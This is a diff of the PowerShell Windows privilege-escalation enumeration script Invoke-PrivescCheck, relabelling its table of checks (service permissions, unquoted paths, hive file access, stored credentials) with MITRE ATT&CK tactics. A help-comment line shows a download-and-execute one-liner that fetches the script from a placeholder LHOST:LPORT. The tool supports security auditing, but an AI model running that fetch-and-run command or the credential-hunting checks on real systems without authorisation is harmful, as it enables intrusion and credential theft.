@@ -37,25 +37,14 @@ function Invoke-PrivescCheck {
     C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'); Invoke-PrivescCheck"
     #>
 
-    [CmdletBinding()] Param(
-        [switch]
-        $Extended = $false,
-
-        [switch]
-        $Experimental = $false,
-
-        [switch]
-        $Force = $false,
-
-        [switch]
-        $Silent = $false,
-
-        [string]
-        $Report,
-
-        [ValidateSet("TXT", "HTML", "CSV", "XML")]
-        [String[]]
-        $Format
+    [CmdletBinding()] param(
+        [switch] $Extended = $false,
+        [switch] $Experimental = $false,
+        [switch] $Force = $false,
+        [switch] $Silent = $false,
+        [string] $Report,
+        [ValidateSet("TXT","HTML","CSV","XML")]
+        [string[]] $Format
     )
 
     # Check wether the current process has admin privileges.
@@ -71,74 +60,74 @@ function Invoke-PrivescCheck {
 
     # The following CSV data contains all the checks
     $AllChecksCsv = @"
-"Id",                               "Command",                                      "Category",         "DisplayName",                          "Type", "Severity", "Format",   "Extended", "RunIfAdmin",   "Experimental", "Description"
-"USER_USER",                        "Invoke-UserCheck",                             "User",             "Identity",                             "Info", "Info",     "List",     "False",    "True",         "False",        "Get the full name of the current user (domain + username) along with the associated Security Identifier (SID)."
-"USER_GROUPS",                      "Invoke-UserGroupsCheck",                       "User",             "Groups",                               "Info", "Info",     "Table",    "False",    "True",         "False",        "List all the groups that are associated to the current user's token."
-"USER_RESTRICTED_SIDS",             "Invoke-UserRestrictedSidsCheck",               "User",             "Restricted SIDs",                      "Info", "Info",     "Table",    "True",     "True",         "False",        "List the restricted SIDs that are associated to the current user's token, if it is WRITE RESTRICTED."
-"USER_PRIVILEGES",                  "Invoke-UserPrivilegesCheck",                   "User",             "Privileges",                           "Info", "Info",     "Table",    "False",    "False",        "False",        "List the current user's privileges and identify the ones that can be leveraged for local privilege escalation."
-"USER_ENV",                         "Invoke-UserEnvCheck",                          "User",             "Environment Variables",                "Info", "Info",     "Table",    "False",    "True",         "False",        "List the environment variables of the current process and try to identify any potentially sensitive information such as passwords or API secrets. This check is simply based on keyword matching and might not be entirely reliable."
-"SERVICE_INSTALLED",                "Invoke-InstalledServicesCheck",                "Services",         "Non-default Services",                 "Info", "Info",     "List",     "False",    "True",         "False",        "List all registered services and filter out the ones that are built into Windows. It does so by parsing the target executable's metadata."
-"SERVICE_THIRD_PARTY",              "Invoke-ThirdPartyDriversCheck",                "Services",         "Third-party Drivers",                  "Info", "Info",     "List",     "True",     "True",         "False",        "List third-party drivers (i.e. drivers that do not originate from Microsoft)."
-"SERVICE_VULN_DRIVER",              "Invoke-VulnerableDriverCheck",                 "Services",         "Vulnerable Drivers",                   "Vuln", "High",     "List",     "False",    "True",         "False",        "Find drivers that are known to be vulnerable using the list provided by loldrivers.io. Note: only vulnerable drivers are checked, not the ones that are categorized as 'malicious'."
-"SERVICE_PERMISSIONS",              "Invoke-ServicesPermissionsCheck",              "Services",         "Service Permissions",                  "Vuln", "High",     "List",     "False",    "False",        "False",        "Interact with the Service Control Manager (SCM) and check whether the current user can modify any registered service."
-"SERVICE_PERMISSIONS_REGISTRY",     "Invoke-ServicesPermissionsRegistryCheck",      "Services",         "Registry Permissions",                 "Vuln", "High",     "List",     "False",    "False",        "False",        "Parse the registry and check whether the current user can modify the configuration of any registered service."
-"SERVICE_IMAGE_PERMISSIONS",        "Invoke-ServicesImagePermissionsCheck",         "Services",         "Binary Permissions",                   "Vuln", "High",     "List",     "False",    "False",        "False",        "List all services and check whether the current user can modify the target executable or write files in its parent folder."
-"SERVICE_UNQUOTED_PATH_INFO",       "Invoke-ServicesUnquotedPathCheck -Info",       "Services",         "Unquoted Path (info)",                 "Info", "Info",     "List",     "True",     "False",        "False",        "List registered services and check whether any of them is configured with an unquoted path."
-"SERVICE_UNQUOTED_PATH",            "Invoke-ServicesUnquotedPathCheck",             "Services",         "Unquoted Path",                        "Vuln", "High",     "List",     "False",    "False",        "False",        "List registered services and check whether any of them is configured with an unquoted path that can be exploited."
-"SERVICE_SCM_PERMISSIONS",          "Invoke-SCMPermissionsCheck",                   "Services",         "SCM Permissions",                      "Vuln", "High",     "List",     "False",    "False",        "False",        "Check whether the current user can perform any privileged actions on the Service Control Manager (SCM)."
-"APP_INSTALLED",                    "Invoke-InstalledProgramsCheck",                "Apps",             "Non-default Apps",                     "Info", "Info",     "Table",    "True",     "True",         "False",        "Enumerate non-default and third-party applications by parsing the registry."
-"APP_MODIFIABLE",                   "Invoke-ModifiableProgramsCheck",               "Apps",             "Modifiable Apps",                      "Vuln", "Medium",   "List",     "True",     "False",        "False",        "List non-default and third-party applications and report the ones that can be modified by the current user."
-"APP_PROGRAMDATA",                  "Invoke-ProgramDataCheck",                      "Apps",             "ProgramData folders/files",            "Info", "Info",     "List",     "True",     "False",        "True",         "List the non-default ProgramData folders and check whether the current user has write permissions. This check is purely informative and the results require manual analysis."
-"APP_STARTUP_INFO",                 "Invoke-ApplicationsOnStartupCheck -Info",      "Apps",             "Startup Apps (info)",                  "Info", "Info",     "List",     "True",     "True",         "False",        "Enumerate the system-wide applications that are run on start-up."
-"APP_STARTUP",                      "Invoke-ApplicationsOnStartupCheck",            "Apps",             "Startup Apps",                         "Vuln", "Medium",   "List",     "True",     "False",        "False",        "Enumerate the system-wide applications that are run on start-up and check whether they can be modified by the current user."
-"APP_PROCESSES",                    "Invoke-RunningProcessCheck",                   "Apps",             "Running Processes",                    "Info", "Info",     "Table",    "True",     "True",         "False",        "List processes that are not owned by the current user and filter out common processes such as 'svchost.exe'."
-"SCHTASKS_IMAGE_PERMISSIONS",       "Invoke-ScheduledTasksImagePermissionsCheck",   "Scheduled Tasks",  "Binary Permissions",                   "Vuln", "Medium",   "List",     "True",     "False",        "False",        "Enumerate the scheduled tasks that are not owned by the current user and checks whether the target binary can be modified. Note that, as a low-privileged user, it's not possible to enumerate all the scheduled tasks."
-"SCHTASKS_UNQUOTED_PATH",           "Invoke-ScheduledTasksUnquotedPathCheck",       "Scheduled Tasks",  "Unquoted Path",                        "Vuln", "Medium",   "List",     "True",     "False",        "True",         "Enumerate the scheduled tasks that are not owned by the current user and checks whether the corresponding command uses an exploitable unquoted path. Note that, as a low-privileged user, it's not possible to enumerate all the scheduled tasks."
-"CREDS_SENSITIVE_HIVE_FILES",       "Invoke-SensitiveHiveFileAccessCheck",          "Creds",            "SAM/SYSTEM/SECURITY Files",            "Vuln", "Medium",   "List",     "False",    "False",        "False",        "Check whether the SAM/SYSTEM/SECURITY files are configured with weak permissions, allowing a low-privileged user to read them - HiveNightmare (CVE-2021-36934)."
-"CREDS_SENSITIVE_HIVE_FILES_VSS",   "Invoke-SensitiveHiveShadowCopyCheck",          "Creds",            "SAM/SYSTEM/SECURITY in shadow copies", "Vuln", "High",     "List",     "False",    "False",        "False",        "Check whether the SAM/SYSTEM/SECURITY files in shadow copies are configured with weak permissions, allowing a low-privileged user to read them. Can happen when HiveNightmare (CVE-2021-36934) mitigations have not been applied manually."
-"CREDS_UNATTEND",                   "Invoke-UnattendFilesCheck",                    "Creds",            "Unattend Files",                       "Vuln", "Medium",   "List",     "False",    "True",         "False",        "Locate 'Unattend' files and check whether they contain any clear-text credentials."
-"CREDS_WINLOGON",                   "Invoke-WinlogonCheck",                         "Creds",            "WinLogon",                             "Vuln", "Medium",   "List",     "False",    "True",         "False",        "Parse the Winlogon registry keys and check whether they contain any clear-text password. Entries that have an empty password field are filtered out."
-"CREDS_CRED_FILES",                 "Invoke-CredentialFilesCheck",                  "Creds",            "Credential Files",                     "Info", "Info",     "List",     "True",     "False",        "False",        "Enumerate the credential files that are present in the current user's HOME folder. This is purely informative."
-"CREDS_VAULT_CRED",                 "Invoke-VaultCredCheck",                        "Creds",            "Vault Creds",                          "Info", "Info",     "List",     "True",     "True",         "False",        "Enumerate the credentials that are saved in the current user's vault."
-"CREDS_VAULT_LIST",                 "Invoke-VaultListCheck",                        "Creds",            "Vault List",                           "Info", "Info",     "List",     "True",     "True",         "False",        "Enumerate the web credentials that are saved in the current user's Vault."
-"CREDS_GPP",                        "Invoke-GPPPasswordCheck",                      "Creds",            "GPP Passwords",                        "Vuln", "Medium",   "List",     "False",    "True",         "False",        "Locate old cached Group Policy Preference files that contain a 'cpassword' field and extract the clear-text credentials."
-"CREDS_PS_HIST",                    "Invoke-PowerShellHistoryCheck",                "Creds",            "PowerShell History",                   "Info", "Info",     "List",     "True",     "True",         "False",        "Locate the current user's PowerShell history file and check whether it contains some clear-text credentials. This check is simply based on keyword matching and might not be entirely reliable."
-"HARDEN_UAC",                       "Invoke-UacCheck",                              "Hardening",        "UAC Settings",                         "Info", "Info",     "List",     "True",     "True",         "False",        "Retrieve the User Access Control (UAC) configuration and check whether it is enabled."
-"HARDEN_LSA_PROTECTION_INFO",       "Invoke-LsaProtectionCheck",                    "Hardening",        "LSA Protection (RunAsPPL)",            "Info", "Info",     "List",     "True",     "True",         "False",        "Checks the status of LSA protection (a.k.a. RunAsPPL)."
-"HARDEN_CREDENTIAL_GUARD",          "Invoke-CredentialGuardCheck",                  "Hardening",        "Credential Guard",                     "Info", "Info",     "List",     "False",    "True",         "False",        "Checks whether Credential Guard is supported and enabled."
-"HARDEN_BIOS_MODE",                 "Invoke-BiosModeCheck",                         "Hardening",        "UEFI & Secure Boot",                   "Info", "Info",     "Table",    "True",     "True",         "False",        "Checks whether UEFI and Secure are supported and enabled."
-"HARDEN_LAPS_INFO",                 "Invoke-LapsCheck",                             "Hardening",        "LAPS",                                 "Info", "Info",     "List",     "True",     "True",         "False",        "Checks whether LAPS is enabled."
-"HARDEN_PS_TRANSCRIPT",             "Invoke-PowershellTranscriptionCheck",          "Hardening",        "PowerShell Transcription",             "Info", "Info",     "List",     "True",     "True",         "False",        "Check whether PowerShell Transcription is configured and enabled. If so, the path of the output log file will be returned."
-"HARDEN_BITLOCKER",                 "Invoke-BitLockerCheck",                        "Hardening",        "BitLocker",                            "Info", "Info",     "List",     "False",    "True",         "False",        "Check whether BitLocker is enabled on the system drive. If so, report the configured startup authentication mode. If the configuration does not enforce advanced TPM authentication with a PIN, a startup key, or both, the result is considered as non-compliant."
-"CONFIG_PATH_FOLDERS",              "Invoke-DllHijackingCheck",                     "Config",           "PATH Folder Permissions",              "Vuln", "High",     "List",     "False",    "False",        "False",        "Retrieve the list of SYSTEM %PATH% folders and check whether the current user has some write permissions in any of them."
-"MISC_HIJACKABLE_DLL",              "Invoke-HijackableDllsCheck",                   "Misc",             "Hijackable DLLs",                      "Info", "Info",     "List",     "False",    "False",        "False",        "List Windows services that are prone to Ghost DLL hijacking. This is particularly relevant if the current user can create files in one of the SYSTEM %PATH% folders."
-"CONFIG_MSI",                       "Invoke-RegistryAlwaysInstallElevatedCheck",    "Config",           "AlwaysInstallElevated",                "Vuln", "High",     "List",     "False",    "False",        "False",        "Check whether the 'AlwaysInstallElevated' registry keys are configured and enabled. If so any user might be able to run arbitary MSI files with SYSTEM privileges."
-"CONFIG_WSUS",                      "Invoke-WsusConfigCheck",                       "Config",           "WSUS Configuration",                   "Vuln", "High",     "List",     "False",    "True",         "False",        "If WSUS is configured and enabled, check whether the service uses an insecure URL (http://*). If so, it might be vulnerable to MitM attacks. Note that in case of local exploitation, the value of 'SetProxyBehaviorForUpdateDetection' determines whether the service uses the system or user proxy settings."
-"CONFIG_HARDENED_UNC_PATHS",        "Invoke-HardenedUNCPathCheck",                  "Config",           "Hardened UNC Paths",                   "Vuln", "Medium",   "List",     "False",    "True",         "False",        "Check hardened UNC paths. If not properly configured, a Man-in-the-Middle might be able to run arbitrary code with SYSTEM privileges by injecting malicious group policies during a group policy update (SYSVOL only)."
-"CONFIG_SCCM_INFO",                 "Invoke-SccmCacheFolderCheck -Info",            "Config",           "SCCM Cache Folder (info)",             "Info", "Info",     "List",     "False",    "True",         "False",        "Checks whether the SCCM cache folder exists. Manual investigation might be required during post-exploitation."
-"CONFIG_SCCM",                      "Invoke-SccmCacheFolderCheck",                  "Config",           "SCCM Cache Folder",                    "Vuln", "Medium",   "List",     "False",    "False",        "False",        "Checks whether the current user can browse the SCCM cache folder. If so, hardcoded credentials might be extracted from MSI package files or scripts."
-"CONFIG_PRINTNIGHTMARE",            "Invoke-PointAndPrintConfigCheck",              "Config",           "Point and Print",                      "Vuln", "High",     "List",     "False",    "True",         "False",        "Checks whether the Print Spooler service is enabled and if the Point and Print configuration allows low-privileged users to install printer drivers."
-"CONFIG_COINSTALLERS",              "Invoke-DriverCoInstallersCheck",               "Config",           "Driver Co-Installers",                 "Info", "Info",     "List",     "False",    "True",         "False",        "Check whether the 'DisableCoInstallers' registry key is absent or disabled. If so any user might be able to run arbitrary code with SYSTEM privileges by plugging a device automatically installing vulnerable software along with its driver."
-"NET_ADAPTERS",                     "Invoke-NetworkAdaptersCheck",                  "Network",          "Interfaces",                           "Info", "Info",     "List",     "True",     "True",         "False",        "Collect detailed information about all active Ethernet adapters."
-"NET_TCP_ENDPOINTS",                "Invoke-TcpEndpointsCheck",                     "Network",          "TCP Endpoints",                        "Info", "Info",     "Table",    "True",     "False",        "False",        "List all TCP ports that are in a LISTEN state. For each one, the corresponding process is also returned."
-"NET_UDP_ENDPOINTS",                "Invoke-UdpEndpointsCheck",                     "Network",          "UDP Endpoints",                        "Info", "Info",     "Table",    "True",     "True",         "False",        "List all UDP ports that are in a LISTEN state. For each one, the corresponding process is also returned. DNS is filtered out to minimize the output."
-"NET_WLAN",                         "Invoke-WlanProfilesCheck",                     "Network",          "Saved Wi-Fi Profiles",                 "Info", "Info",     "List",     "True",     "True",         "False",        "Enumerate saved Wifi profiles. For WEP/WPA-PSK profiles, the clear-text passphrase is extracted (when possible). For 802.1x profiles, a series of tests is performed to highlight potential misconfiguration."
-"NET_AIRSTRIKE",                    "Invoke-AirstrikeAttackCheck",                  "Network",          "Select network from lock screen",      "Info", "Info",     "List",     "True",     "True",         "False",        "Checks whether the 'Do not display network selection UI' policy is enforced on workstations (c.f. Airstrike attack)."
-"UPDATE_HISTORY",                   "Invoke-WindowsUpdateCheck",                    "Updates",          "Last Windows Update Date",             "Info", "Info",     "Table",    "True",     "True",         "False",        "Interact with the Windows Update service and determine when the system was last updated. Note that this check might be unreliable."
-"UPDATE_HOTFIX_INFO",               "Invoke-HotFixCheck -Info",                     "Updates",          "System up to date? (info)",            "Info", "Info",     "Table",    "True",     "True",         "False",        "Enumerate the installed updates and hotfixes by parsing the registry. If this fails, the check will fall back to the built-in 'Get-HotFix' cmdlet."
-"UPDATE_HOTFIX",                    "Invoke-HotFixCheck",                           "Updates",          "System up to date?",                   "Vuln", "Medium",   "Table",    "False",    "True",         "False",        "Enumerate the installed updates and hotfixes and check whether a patch was applied in the last 31 days."
-"MISC_AVEDR",                       "Invoke-EndpointProtectionCheck",               "Misc",             "Endpoint Protection",                  "Info", "Info",     "Table",    "True",     "True",         "False",        "Enumerate installed security products (AV, EDR). This check is based on keyword matching (loaded DLLs, running processes, installed applications and registered services)."
-"MISC_DEFENDER_EXCLUSIONS",         "Invoke-DefenderExclusionsCheck",               "Misc",             "Defender exclusions",                  "Info", "Info",     "Table",    "True",     "True",         "False",        "List Microsoft Defender exclusions that were configured both locally and through GPO."
-"MISC_SYSINFO",                     "Invoke-SystemInfoCheck",                       "Misc",             "OS Version",                           "Info", "Info",     "Table",    "True",     "True",         "False",        "Print the detailed version number of the Operating System. If we can't get the update history, this might be useful."
-"MISC_ADMINS",                      "Invoke-LocalAdminGroupCheck",                  "Misc",             "Local Admin Group",                    "Info", "Info",     "Table",    "True",     "True",         "False",        "Enumerate the users and groups that belong to the local 'Administrators' group."
-"MISC_USER_SESSION_LIST",           "Invoke-UserSessionListCheck",                  "Misc",             "User session list",                    "Info", "Info",     "Table",    "False",    "True",         "False",        "Enumerate the sessions of the currently logged-on users. It might be possible to capture or relay the NTLM/Kerberos authentication of these users (RemotePotato0, KrbRelay)."
-"MISC_HOMES",                       "Invoke-UsersHomeFolderCheck",                  "Misc",             "User Home Folders",                    "Info", "Info",     "Table",    "True",     "False",        "False",        "Enumerate local HOME folders and check for potentially weak permissions."
-"MISC_MACHINE_ROLE",                "Invoke-MachineRoleCheck",                      "Misc",             "Machine Role",                         "Info", "Info",     "Table",    "True",     "True",         "False",        "Simply return the machine's role. It can be either 'Workstation', 'Server' or 'Domain Controller'."
-"MISC_STARTUP_EVENTS",              "Invoke-SystemStartupHistoryCheck",             "Misc",             "System Startup History",               "Info", "Info",     "Table",    "True",     "True",         "False",        "Retrieve the machine's startup history. This might be useful to figure out how often a server is rebooted. In the case of a workstation, such metric isn't as relevant."
-"MISC_STARTUP_LAST",                "Invoke-SystemStartupCheck",                    "Misc",             "Last System Startup",                  "Info", "Info",     "Table",    "True",     "True",         "False",        "Determine the last system startup date and time based on the current tick count. Note that this might be unreliable."
-"MISC_DRIVES",                      "Invoke-SystemDrivesCheck",                     "Misc",             "Filesystem Drives",                    "Info", "Info",     "Table",    "True",     "True",         "False",        "List partitions, removable storage and mapped network shares."
-"MISC_NAMED_PIPES",                 "Invoke-NamedPipePermissionsCheck",             "Misc",             "Named Pipes Permission",               "Info", "Info",     "List",     "True",     "False",        "True",         "List modifiable named pipes that are not owned by the current user."
-"MISC_LEAKED_HANDLES",              "Invoke-ExploitableLeakedHandlesCheck",         "Misc",             "Exploitable leaked handles",           "Info", "Info",     "List",     "True",     "False",        "False",        "List leaked handles to privileged objects such as Processes, Threads, and Files."
+"Id",                             "Command",                                    "Category",                      "DisplayName",                         "Severity", "Format",   "Extended", "RunIfAdmin",   "Experimental", "Description"
+"USER_USER",                      "Invoke-UserCheck",                           "TA0043 - Reconnaissance",       "User identity",                       "Info",     "List",     "False",    "True",         "False",        "Get the full name of the current user (domain + username) along with the associated Security Identifier (SID)."
+"USER_GROUPS",                    "Invoke-UserGroupsCheck",                     "TA0043 - Reconnaissance",       "User groups",                         "Info",     "Table",    "False",    "True",         "False",        "List all the groups that are associated to the current user's token."
+"USER_RESTRICTED_SIDS",           "Invoke-UserRestrictedSidsCheck",             "TA0043 - Reconnaissance",       "User restricted SIDs",                "Info",     "Table",    "True",     "True",         "False",        "List the restricted SIDs that are associated to the current user's token, if it is WRITE RESTRICTED."
+"USER_PRIVILEGES",                "Invoke-UserPrivilegesCheck",                 "TA0004 - Privilege Escalation", "User privileges",                     "Info",     "Table",    "False",    "False",        "False",        "List the current user's privileges and identify the ones that can be leveraged for local privilege escalation."
+"USER_ENV",                       "Invoke-UserEnvCheck",                        "TA0006 - Credential Access",    "User environment variables",          "Info",     "Table",    "False",    "True",         "False",        "List the environment variables of the current process and try to identify any potentially sensitive information such as passwords or API secrets. This check is simply based on keyword matching and might not be entirely reliable."
+"SERVICE_INSTALLED",              "Invoke-InstalledServicesCheck",              "TA0004 - Privilege Escalation", "Non-default services",                "Info",     "List",     "False",    "True",         "False",        "List all registered services and filter out the ones that are built into Windows. It does so by parsing the target executable's metadata."
+"SERVICE_THIRD_PARTY",            "Invoke-ThirdPartyDriversCheck",              "TA0004 - Privilege Escalation", "Third-party Kernel drivers",          "Info",     "List",     "True",     "True",         "False",        "List third-party drivers (i.e. drivers that do not originate from Microsoft)."
+"SERVICE_VULN_DRIVER",            "Invoke-VulnerableDriverCheck",               "TA0004 - Privilege Escalation", "Vulnerable Kernel drivers",           "High",     "List",     "False",    "True",         "False",        "Find drivers that are known to be vulnerable using the list provided by loldrivers.io. Note: only vulnerable drivers are checked, not the ones that are categorized as 'malicious'."
+"SERVICE_PERMISSIONS",            "Invoke-ServicesPermissionsCheck",            "TA0004 - Privilege Escalation", "Service permissions",                 "High",     "List",     "False",    "False",        "False",        "Interact with the Service Control Manager (SCM) and check whether the current user can modify any registered service."
+"SERVICE_PERMISSIONS_REGISTRY",   "Invoke-ServicesPermissionsRegistryCheck",    "TA0004 - Privilege Escalation", "Service registry permissions",        "High",     "List",     "False",    "False",        "False",        "Parse the registry and check whether the current user can modify the configuration of any registered service."
+"SERVICE_IMAGE_PERMISSIONS",      "Invoke-ServicesImagePermissionsCheck",       "TA0004 - Privilege Escalation", "Service binary permissions",          "High",     "List",     "False",    "False",        "False",        "List all services and check whether the current user can modify the target executable or write files in its parent folder."
+"SERVICE_UNQUOTED_PATH_INFO",     "Invoke-ServicesUnquotedPathCheck -Info",     "TA0004 - Privilege Escalation", "Service unquoted paths (info)",       "Info",     "List",     "True",     "False",        "False",        "List registered services and check whether any of them is configured with an unquoted path."
+"SERVICE_UNQUOTED_PATH",          "Invoke-ServicesUnquotedPathCheck",           "TA0004 - Privilege Escalation", "Service unquoted paths",              "High",     "List",     "False",    "False",        "False",        "List registered services and check whether any of them is configured with an unquoted path that can be exploited."
+"SERVICE_SCM_PERMISSIONS",        "Invoke-SCMPermissionsCheck",                 "TA0004 - Privilege Escalation", "Service Control Manager permissions", "High",     "List",     "False",    "False",        "False",        "Check whether the current user can perform any privileged actions on the Service Control Manager (SCM)."
+"APP_INSTALLED",                  "Invoke-InstalledProgramsCheck",              "TA0043 - Reconnaissance",       "Non-default applications",            "Info",     "Table",    "True",     "True",         "False",        "Enumerate non-default and third-party applications by parsing the registry."
+"APP_MODIFIABLE",                 "Invoke-ModifiableProgramsCheck",             "TA0004 - Privilege Escalation", "Application permissions",             "Medium",   "List",     "True",     "False",        "False",        "List non-default and third-party applications and report the ones that can be modified by the current user."
+"APP_PROGRAMDATA",                "Invoke-ProgramDataCheck",                    "TA0004 - Privilege Escalation", "Non-default ProgramData folders",     "Info",     "List",     "True",     "False",        "True",         "List the non-default ProgramData folders and check whether the current user has write permissions. This check is purely informative and the results require manual analysis."
+"APP_STARTUP_INFO",               "Invoke-ApplicationsOnStartupCheck -Info",    "TA0004 - Privilege Escalation", "Startup applications (info)",         "Info",     "List",     "True",     "True",         "False",        "Enumerate the system-wide applications that are run on start-up."
+"APP_STARTUP",                    "Invoke-ApplicationsOnStartupCheck",          "TA0004 - Privilege Escalation", "Startup application permissions",     "Medium",   "List",     "True",     "False",        "False",        "Enumerate the system-wide applications that are run on start-up and check whether they can be modified by the current user."
+"APP_PROCESSES",                  "Invoke-RunningProcessCheck",                 "TA0043 - Reconnaissance",       "Running processes",                   "Info",     "Table",    "True",     "True",         "False",        "List processes that are not owned by the current user and filter out common processes such as 'svchost.exe'."
+"SCHTASKS_IMAGE_PERMISSIONS",     "Invoke-ScheduledTasksImagePermissionsCheck", "TA0004 - Privilege Escalation", "Scheduled task binary permissions",   "Medium",   "List",     "True",     "False",        "False",        "Enumerate the scheduled tasks that are not owned by the current user and checks whether the target binary can be modified. Note that, as a low-privileged user, it's not possible to enumerate all the scheduled tasks."
+"SCHTASKS_UNQUOTED_PATH",         "Invoke-ScheduledTasksUnquotedPathCheck",     "TA0004 - Privilege Escalation", "Scheduled task unquoted paths",       "Medium",   "List",     "True",     "False",        "True",         "Enumerate the scheduled tasks that are not owned by the current user and checks whether the corresponding command uses an exploitable unquoted path. Note that, as a low-privileged user, it's not possible to enumerate all the scheduled tasks."
+"CREDS_SENSITIVE_HIVE_FILES",     "Invoke-SensitiveHiveFileAccessCheck",        "TA0006 - Credential Access",    "Hive file permissions",               "Medium",   "List",     "False",    "False",        "False",        "Check whether the SAM/SYSTEM/SECURITY files are configured with weak permissions, allowing a low-privileged user to read them - HiveNightmare (CVE-2021-36934)."
+"CREDS_SENSITIVE_HIVE_FILES_VSS", "Invoke-SensitiveHiveShadowCopyCheck",        "TA0006 - Credential Access",    "Hive file shadow copy permissions",   "High",     "List",     "False",    "False",        "False",        "Check whether the SAM/SYSTEM/SECURITY files in shadow copies are configured with weak permissions, allowing a low-privileged user to read them. Can happen when HiveNightmare (CVE-2021-36934) mitigations have not been applied manually."
+"CREDS_UNATTEND",                 "Invoke-UnattendFilesCheck",                  "TA0006 - Credential Access",    "Unattend file credentials",           "Medium",   "List",     "False",    "True",         "False",        "Locate 'Unattend' files and check whether they contain any clear-text credentials."
+"CREDS_WINLOGON",                 "Invoke-WinlogonCheck",                       "TA0006 - Credential Access",    "WinLogon credentials",                "Medium",   "List",     "False",    "True",         "False",        "Parse the Winlogon registry keys and check whether they contain any clear-text password. Entries that have an empty password field are filtered out."
+"CREDS_CRED_FILES",               "Invoke-CredentialFilesCheck",                "TA0006 - Credential Access",    "Credential files",                    "Info",     "List",     "True",     "False",        "False",        "Enumerate the credential files that are present in the current user's HOME folder. This is purely informative."
+"CREDS_VAULT_CRED",               "Invoke-VaultCredCheck",                      "TA0006 - Credential Access",    "Vault credentials (creds)",           "Info",     "List",     "True",     "True",         "False",        "Enumerate the credentials that are saved in the current user's vault."
+"CREDS_VAULT_LIST",               "Invoke-VaultListCheck",                      "TA0006 - Credential Access",    "Vault credentials (list)",            "Info",     "List",     "True",     "True",         "False",        "Enumerate the web credentials that are saved in the current user's Vault."
+"CREDS_GPP",                      "Invoke-GPPPasswordCheck",                    "TA0006 - Credential Access",    "GPP passwords",                       "Medium",   "List",     "False",    "True",         "False",        "Locate old cached Group Policy Preference files that contain a 'cpassword' field and extract the clear-text credentials."
+"CREDS_PS_HIST",                  "Invoke-PowerShellHistoryCheck",              "TA0006 - Credential Access",    "PowerShell history",                  "Info",     "List",     "True",     "True",         "False",        "Locate the current user's PowerShell history file and check whether it contains some clear-text credentials. This check is simply based on keyword matching and might not be entirely reliable."
+"HARDEN_UAC",                     "Invoke-UacCheck",                            "TA0004 - Privilege Escalation", "UAC settings",                        "Info",     "List",     "True",     "True",         "False",        "Retrieve the User Access Control (UAC) configuration and check whether it is enabled."
+"HARDEN_LSA_PROTECTION_INFO",     "Invoke-LsaProtectionCheck",                  "TA0005 - Defense Evasion",      "LSA Protection",                      "Info",     "List",     "True",     "True",         "False",        "Checks the status of LSA protection (a.k.a. RunAsPPL)."
+"HARDEN_CREDENTIAL_GUARD",        "Invoke-CredentialGuardCheck",                "TA0005 - Defense Evasion",      "Credential Guard",                    "Info",     "List",     "False",    "True",         "False",        "Checks whether Credential Guard is supported and enabled."
+"HARDEN_BIOS_MODE",               "Invoke-BiosModeCheck",                       "TA0003 - Persistence",          "UEFI & Secure Boot",                  "Info",     "Table",    "True",     "True",         "False",        "Checks whether UEFI and Secure are supported and enabled."
+"HARDEN_LAPS_INFO",               "Invoke-LapsCheck",                           "TA0008 - Lateral Movement",     "LAPS",                                "Info",     "List",     "True",     "True",         "False",        "Checks whether LAPS is enabled."
+"HARDEN_PS_TRANSCRIPT",           "Invoke-PowershellTranscriptionCheck",        "TA0005 - Defense Evasion",      "PowerShell transcription",            "Info",     "List",     "True",     "True",         "False",        "Check whether PowerShell Transcription is configured and enabled. If so, the path of the output log file will be returned."
+"HARDEN_BITLOCKER",               "Invoke-BitLockerCheck",                      "TA0001 - Initial Access",       "BitLocker configuration",             "Info",     "List",     "False",    "True",         "False",        "Check whether BitLocker is enabled on the system drive. If so, report the configured startup authentication mode. If the configuration does not enforce advanced TPM authentication with a PIN, a startup key, or both, the result is considered as non-compliant."
+"CONFIG_PATH_FOLDERS",            "Invoke-DllHijackingCheck",                   "TA0004 - Privilege Escalation", "PATH folder permissions",             "High",     "List",     "False",    "False",        "False",        "Retrieve the list of SYSTEM %PATH% folders and check whether the current user has some write permissions in any of them."
+"MISC_HIJACKABLE_DLL",            "Invoke-HijackableDllsCheck",                 "TA0004 - Privilege Escalation", "Known ghost DLLs",                    "Info",     "List",     "False",    "False",        "False",        "List Windows services that are prone to Ghost DLL hijacking. This is particularly relevant if the current user can create files in one of the SYSTEM %PATH% folders."
+"CONFIG_MSI",                     "Invoke-RegistryAlwaysInstallElevatedCheck",  "TA0004 - Privilege Escalation", "AlwaysInstallElevated",               "High",     "List",     "False",    "False",        "False",        "Check whether the 'AlwaysInstallElevated' registry keys are configured and enabled. If so any user might be able to run arbitary MSI files with SYSTEM privileges."
+"CONFIG_WSUS",                    "Invoke-WsusConfigCheck",                     "TA0008 - Lateral Movement",     "WSUS configuration",                  "High",     "List",     "False",    "True",         "False",        "If WSUS is configured and enabled, check whether the service uses an insecure URL (http://*). If so, it might be vulnerable to MitM attacks. Note that in case of local exploitation, the value of 'SetProxyBehaviorForUpdateDetection' determines whether the service uses the system or user proxy settings."
+"CONFIG_HARDENED_UNC_PATHS",      "Invoke-HardenedUNCPathCheck",                "TA0008 - Lateral Movement",     "Hardened UNC paths",                  "Medium",   "List",     "False",    "True",         "False",        "Check hardened UNC paths. If not properly configured, a Man-in-the-Middle might be able to run arbitrary code with SYSTEM privileges by injecting malicious group policies during a group policy update (SYSVOL only)."
+"CONFIG_SCCM_INFO",               "Invoke-SccmCacheFolderCheck -Info",          "TA0006 - Credential Access",    "SCCM cache folder",                   "Info",     "List",     "False",    "True",         "False",        "Checks whether the SCCM cache folder exists. Manual investigation might be required during post-exploitation."
+"CONFIG_SCCM",                    "Invoke-SccmCacheFolderCheck",                "TA0006 - Credential Access",    "SCCM cache folder permissions",       "Medium",   "List",     "False",    "False",        "False",        "Checks whether the current user can browse the SCCM cache folder. If so, hardcoded credentials might be extracted from MSI package files or scripts."
+"CONFIG_PRINTNIGHTMARE",          "Invoke-PointAndPrintConfigCheck",            "TA0004 - Privilege Escalation", "Point and Print configuration",       "High",     "List",     "False",    "True",         "False",        "Checks whether the Print Spooler service is enabled and if the Point and Print configuration allows low-privileged users to install printer drivers."
+"CONFIG_COINSTALLERS",            "Invoke-DriverCoInstallersCheck",             "TA0004 - Privilege Escalation", "Driver co-installers",                "Info",     "List",     "False",    "True",         "False",        "Check whether the 'DisableCoInstallers' registry key is absent or disabled. If so any user might be able to run arbitrary code with SYSTEM privileges by plugging a device automatically installing vulnerable software along with its driver."
